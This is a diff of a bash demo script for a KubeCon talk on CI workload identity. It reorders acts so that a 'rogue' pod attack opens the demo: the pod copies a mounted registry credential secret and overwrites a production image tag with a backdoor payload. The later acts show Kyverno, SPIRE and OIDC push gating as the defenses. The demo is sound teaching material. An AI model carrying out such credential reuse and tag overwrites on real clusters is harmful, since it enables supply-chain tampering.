@@ -61,9 +61,9 @@ echo -e "${PURPLE}║                                                           
 echo -e "${PURPLE}║      KubeCon NA 2026: \"Your CI's Mistaken Identity\"                             ║${COLOR_RESET}"
 if [[ "$SELECTED_ACT" != "all" && "$SELECTED_ACT" != "0" ]]; then
   case "$SELECTED_ACT" in
-    1) ACT_TITLE="Act 1: Kyverno at the Gate & Separation of Duties Attestations" ;;
-    2) ACT_TITLE="Act 2: Ambient Push Hijack vs. Task-Scoped OCI Push Gating" ;;
-    3) ACT_TITLE="Act 3: Portable Secretless Service Access (CVE Database)" ;;
+    1) ACT_TITLE="Act 1: The Breakdown (Ambient Authority & Secret Hijack)" ;;
+    2) ACT_TITLE="Act 2: Task Admission & Cryptographic Identity (Kyverno & SPIRE)" ;;
+    3) ACT_TITLE="Act 3: Same-Namespace API Gating (OCI Push Gating & Secretless Services)" ;;
     4) ACT_TITLE="Act 4: Managed Release Boundary (Dual-Gated Authority)" ;;
     *) ACT_TITLE="Act ${SELECTED_ACT}" ;;
   esac
@@ -108,11 +108,145 @@ clear
 fi
 
 # ==============================================================================
-# ACT 1: ADMISSION CONTROL & ROLE-SCOPED ATTESTATION (THE PROMISE)
+# ACT 1: THE BREAKDOWN (AMBIENT AUTHORITY & SECRET HIJACK)
 # ==============================================================================
 if should_run_act 1; then
 p "# =================================================================="
-p "# ACT 1: Kyverno at the Gate & Separation of Duties Attestations"
+p "# ACT 1: The Breakdown (Ambient Authority & Secret Hijack)"
+p "# =================================================================="
+p "# In Kubernetes, the 'default' keyless workload identity is projected ServiceAccount tokens:"
+p "#   iss: https://kubernetes.default.svc"
+p "#   sub: system:serviceaccount:<namespace>:<serviceaccount>"
+p "#"
+p "# Let's inspect what identity a task receives under this standard pattern:"
+kubectl delete taskrun demo-sa-token-inspection -n default-tenant --wait=true >/dev/null 2>&1 || true
+pe "cat << 'EOF' | kubectl apply -f -
+apiVersion: tekton.dev/v1
+kind: TaskRun
+metadata:
+  name: demo-sa-token-inspection
+  namespace: default-tenant
+  labels:
+    appstudio.openshift.io/application: demo-app
+    appstudio.openshift.io/component: demo-app
+    app.kubernetes.io/part-of: kubecon-demo
+spec:
+  taskSpec:
+    stepTemplate:
+      volumeMounts:
+      - mountPath: /var/run/secrets/tokens
+        name: sa-token
+    steps:
+    - name: inspect-sa-token
+      image: curlimages/curl:latest
+      command:
+      - /bin/sh
+      - -c
+      - |
+        TOKEN=\$(cat /var/run/secrets/tokens/sa-token)
+        echo \"\$TOKEN\"
+    volumes:
+    - name: sa-token
+      projected:
+        sources:
+        - serviceAccountToken:
+            audience: https://registry-oidc.kind-registry:5000
+            expirationSeconds: 3600
+            path: sa-token
+EOF"
+
+kubectl wait --for=condition=Succeeded taskrun/demo-sa-token-inspection -n default-tenant --timeout=30s >/dev/null 2>&1 || true
+pe "kubectl logs demo-sa-token-inspection-pod -n default-tenant -c step-inspect-sa-token | python3 -c \"
+import sys, json, base64
+raw = sys.stdin.read().strip()
+for line in raw.splitlines():
+    if line.startswith('ey'):
+        p = line.split('.')[1]
+        p += '=' * (-len(p)%4)
+        claims = json.loads(base64.urlsafe_b64decode(p).decode())
+        print('Projected SA Identity (Default Keyless):')
+        print('  Issuer (iss):', claims.get('iss'))
+        print('  Subject (sub):', claims.get('sub'))
+        print('  Namespace:    ', claims.get('kubernetes.io', {}).get('namespace'))
+        print('  ServiceAccount:', claims.get('kubernetes.io', {}).get('serviceaccount', {}).get('name'))
+\""
+demo_cleanup taskrun demo-sa-token-inspection -n default-tenant
+
+p "# Notice the problem: The identity is coarse-grained to the ServiceAccount (default-tenant:default)."
+p "# EVERY task running in this namespace shares this exact same identity and ambient credentials!"
+wait
+
+p "# THE ATTACK:"
+p "# A rogue task running in the same namespace under the same ServiceAccount abuses regcred"
+p "# to overwrite production image tag 'slsa-e2e-test:latest' with a malicious backdoor!"
+kubectl delete pod rogue-ambient-push -n default-tenant --wait=true >/dev/null 2>&1 || true
+pe "cat << 'EOF' | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: rogue-ambient-push
+  namespace: default-tenant
+  labels:
+    appstudio.openshift.io/application: demo-app
+    appstudio.openshift.io/component: demo-app
+    app.kubernetes.io/part-of: kubecon-demo
+spec:
+  containers:
+  - name: attacker
+    image: quay.io/konflux-ci/task-runner:1.3.0@sha256:3f007bf58821885f8aa30d72c84fcbfcb14babc6521eaf6ac1bc4f8c078d9e58
+    command:
+    - /bin/bash
+    - -c
+    - |
+      set -e
+      export SSL_CERT_DIR=/tekton-custom-certs
+      mkdir -p ~/.docker
+      cp /tekton/creds-secrets/regcred-internal-registry/.dockerconfigjson ~/.docker/config.json
+      
+      echo 'MALICIOUS BACKDOOR EXECUTED' > /tmp/payload.txt
+      cd /tmp
+      oras push --insecure registry-service.kind-registry/slsa-e2e-test:latest \
+        --artifact-type application/vnd.konflux.test \
+        payload.txt:application/text
+      
+      oras pull --insecure registry-service.kind-registry/slsa-e2e-test:latest -o /tmp/pulled
+      echo \"[VERIFICATION] Tag contents: \$(cat /tmp/pulled/payload.txt)\"
+    volumeMounts:
+    - mountPath: /tekton/creds-secrets/regcred-internal-registry
+      name: regcred
+    - mountPath: /tekton-custom-certs/ca-bundle.crt
+      name: trusted-ca
+      subPath: ca-bundle.crt
+  volumes:
+  - name: regcred
+    secret:
+      secretName: regcred-internal-registry
+  - name: trusted-ca
+    configMap:
+      items:
+      - key: ca-bundle.crt
+        path: ca-bundle.crt
+      name: trusted-ca
+  restartPolicy: Never
+EOF"
+
+kubectl wait --for=jsonpath='{.status.phase}'=Succeeded pod/rogue-ambient-push -n default-tenant --timeout=30s >/dev/null 2>&1 || sleep 3
+pe "kubectl logs rogue-ambient-push -n default-tenant | grep -A 5 \"VERIFICATION\""
+demo_cleanup pod rogue-ambient-push -n default-tenant
+
+p "# The tag was silently overwritten because traditional SA credentials provide ambient authority!"
+wait
+
+clear
+finish_act 1
+fi
+
+# ==============================================================================
+# ACT 2: TASK ADMISSION & CRYPTOGRAPHIC IDENTITY (KYVERNO & SPIRE)
+# ==============================================================================
+if should_run_act 2; then
+p "# =================================================================="
+p "# ACT 2: Task Admission & Cryptographic Identity (Kyverno & SPIRE)"
 p "# =================================================================="
 p "# Inspect Kyverno's task classification rules before admission:"
 p "# Notice: default rule sets 'trusted-task-role: dev'; pinned catalog bundles upgrade to 'prod':"
@@ -253,150 +387,16 @@ demo_cleanup taskrun demo-signed-task -n default-tenant
 wait
 clear
 
-p "# 4. Separation of Duties Policy Enforcement (Conforma Rego):"
-p "# When tasks sign role-scoped attestations:"
-p "#   • Scanner (trivy-sbom-scan) signs CVE reports"
-p "#   • Builder (buildah-oci-ta) signs SBOMs & Provenance"
-pe "cat ${DIR}/manifests/separation_of_duties.rego"
-
-p "# Test Conforma policy against an adversarial attack (Builder attempts to forge clean CVE scan):"
-pe "opa test ${DIR}/manifests/separation_of_duties.rego ${DIR}/manifests/separation_of_duties_test.rego -v"
-
-wait
-clear
-finish_act 1
+finish_act 2
 fi
 
 # ==============================================================================
-# ACT 2: AMBIENT PUSH HIJACK VS TASK-SCOPED OCI PUSH GATING
+# ACT 3: SAME-NAMESPACE API GATING (OCI PUSH GATING & SECRETLESS SERVICES)
 # ==============================================================================
-if should_run_act 2; then
+if should_run_act 3; then
 p "# =================================================================="
-p "# ACT 2: Ambient Push Hijack vs. Task-Scoped OCI Push Gating"
+p "# ACT 3: Same-Namespace API Gating (OCI Push Gating & Secretless Services)"
 p "# =================================================================="
-p "# In Kubernetes, the 'default' keyless workload identity is projected ServiceAccount tokens:"
-p "#   iss: https://kubernetes.default.svc"
-p "#   sub: system:serviceaccount:<namespace>:<serviceaccount>"
-p "#"
-p "# Let's inspect what identity a task receives under this standard pattern:"
-kubectl delete taskrun demo-sa-token-inspection -n default-tenant --wait=true >/dev/null 2>&1 || true
-pe "cat << 'EOF' | kubectl apply -f -
-apiVersion: tekton.dev/v1
-kind: TaskRun
-metadata:
-  name: demo-sa-token-inspection
-  namespace: default-tenant
-  labels:
-    appstudio.openshift.io/application: demo-app
-    appstudio.openshift.io/component: demo-app
-    app.kubernetes.io/part-of: kubecon-demo
-spec:
-  taskSpec:
-    stepTemplate:
-      volumeMounts:
-      - mountPath: /var/run/secrets/tokens
-        name: sa-token
-    steps:
-    - name: inspect-sa-token
-      image: curlimages/curl:latest
-      command:
-      - /bin/sh
-      - -c
-      - |
-        TOKEN=\$(cat /var/run/secrets/tokens/sa-token)
-        echo \"\$TOKEN\"
-    volumes:
-    - name: sa-token
-      projected:
-        sources:
-        - serviceAccountToken:
-            audience: https://registry-oidc.kind-registry:5000
-            expirationSeconds: 3600
-            path: sa-token
-EOF"
-
-kubectl wait --for=condition=Succeeded taskrun/demo-sa-token-inspection -n default-tenant --timeout=30s >/dev/null 2>&1 || true
-pe "kubectl logs demo-sa-token-inspection-pod -n default-tenant -c step-inspect-sa-token | python3 -c \"
-import sys, json, base64
-raw = sys.stdin.read().strip()
-for line in raw.splitlines():
-    if line.startswith('ey'):
-        p = line.split('.')[1]
-        p += '=' * (-len(p)%4)
-        claims = json.loads(base64.urlsafe_b64decode(p).decode())
-        print('Projected SA Identity (Default Keyless):')
-        print('  Issuer (iss):', claims.get('iss'))
-        print('  Subject (sub):', claims.get('sub'))
-        print('  Namespace:    ', claims.get('kubernetes.io', {}).get('namespace'))
-        print('  ServiceAccount:', claims.get('kubernetes.io', {}).get('serviceaccount', {}).get('name'))
-\""
-demo_cleanup taskrun demo-sa-token-inspection -n default-tenant
-
-p "# Notice the problem: The identity is coarse-grained to the ServiceAccount (default-tenant:default)."
-p "# EVERY task running in this namespace shares this exact same identity and ambient credentials!"
-wait
-
-p "# THE ATTACK:"
-p "# A rogue task running in the same namespace under the same ServiceAccount abuses regcred"
-p "# to overwrite production image tag 'slsa-e2e-test:latest' with a malicious backdoor!"
-kubectl delete pod rogue-ambient-push -n default-tenant --wait=true >/dev/null 2>&1 || true
-pe "cat << 'EOF' | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: rogue-ambient-push
-  namespace: default-tenant
-  labels:
-    appstudio.openshift.io/application: demo-app
-    appstudio.openshift.io/component: demo-app
-    app.kubernetes.io/part-of: kubecon-demo
-spec:
-  containers:
-  - name: attacker
-    image: quay.io/konflux-ci/task-runner:1.3.0@sha256:3f007bf58821885f8aa30d72c84fcbfcb14babc6521eaf6ac1bc4f8c078d9e58
-    command:
-    - /bin/bash
-    - -c
-    - |
-      set -e
-      export SSL_CERT_DIR=/tekton-custom-certs
-      mkdir -p ~/.docker
-      cp /tekton/creds-secrets/regcred-internal-registry/.dockerconfigjson ~/.docker/config.json
-      
-      echo 'MALICIOUS BACKDOOR EXECUTED' > /tmp/payload.txt
-      cd /tmp
-      oras push --insecure registry-service.kind-registry/slsa-e2e-test:latest \
-        --artifact-type application/vnd.konflux.test \
-        payload.txt:application/text
-      
-      oras pull --insecure registry-service.kind-registry/slsa-e2e-test:latest -o /tmp/pulled
-      echo \"[VERIFICATION] Tag contents: \$(cat /tmp/pulled/payload.txt)\"
-    volumeMounts:
-    - mountPath: /tekton/creds-secrets/regcred-internal-registry
-      name: regcred
-    - mountPath: /tekton-custom-certs/ca-bundle.crt
-      name: trusted-ca
-      subPath: ca-bundle.crt
-  volumes:
-  - name: regcred
-    secret:
-      secretName: regcred-internal-registry
-  - name: trusted-ca
-    configMap:
-      items:
-      - key: ca-bundle.crt
-        path: ca-bundle.crt
-      name: trusted-ca
-  restartPolicy: Never
-EOF"
-
-kubectl wait --for=jsonpath='{.status.phase}'=Succeeded pod/rogue-ambient-push -n default-tenant --timeout=30s >/dev/null 2>&1 || sleep 3
-pe "kubectl logs rogue-ambient-push -n default-tenant | grep -A 5 \"VERIFICATION\""
-demo_cleanup pod rogue-ambient-push -n default-tenant
-
-p "# The tag was silently overwritten because traditional SA credentials provide ambient authority!"
-wait
-
 p "# THE DEFENSE: Task-Scoped OCI Push Gating with Zot OIDC Bearer Auth"
 p "# Zot validates push handshakes against SPIRE OIDC discovery keys (/keys)."
 p "# Access control policy strictly restricts writes to the vetted builder role:"
@@ -520,16 +520,10 @@ demo_cleanup taskrun demo-builder-gated-push -n default-tenant
 p "# HTTP/2 202 Accepted! Push upload session created strictly via Workload Identity."
 wait
 clear
-finish_act 2
-fi
 
-# ==============================================================================
-# ACT 3: PORTABLE SECRETLESS SERVICE ACCESS (TOKEN EXCHANGE)
-# ==============================================================================
-if should_run_act 3; then
-p "# =================================================================="
-p "# ACT 3: Portable Secretless Service Access (Cross-Namespace Token Exchange)"
-p "# =================================================================="
+p "# ------------------------------------------------------------------"
+p "# Part B: Portable Secretless Service Access (Token Exchange)"
+p "# ------------------------------------------------------------------"
 p "# Workload identity isn't just for signing—it eliminates static API tokens across pipelines."
 p "# An internal CVE database service is running in namespace 'services'."
 p "# It mounts ZERO Kubernetes secrets and validates callers via SPIRE OIDC discovery keys (/keys)."
@@ -643,6 +637,21 @@ demo_cleanup pod test-scanner-client -n default-tenant
 demo_cleanup taskrun demo-trusted-scanner-query -n default-tenant
 
 p "# HTTP/1.0 200 OK! Zero pre-shared secrets, zero credentials mounted in default-tenant."
+wait
+clear
+
+p "# ------------------------------------------------------------------"
+p "# Part C: Separation of Duties Policy Enforcement (Conforma Rego)"
+p "# ------------------------------------------------------------------"
+p "# 4. Separation of Duties Policy Enforcement (Conforma Rego):"
+p "# When tasks sign role-scoped attestations:"
+p "#   • Scanner (trivy-sbom-scan) signs CVE reports"
+p "#   • Builder (buildah-oci-ta) signs SBOMs & Provenance"
+pe "cat ${DIR}/manifests/separation_of_duties.rego"
+
+p "# Test Conforma policy against an adversarial attack (Builder attempts to forge clean CVE scan):"
+pe "opa test ${DIR}/manifests/separation_of_duties.rego ${DIR}/manifests/separation_of_duties_test.rego -v"
+
 wait
 clear
 finish_act 3
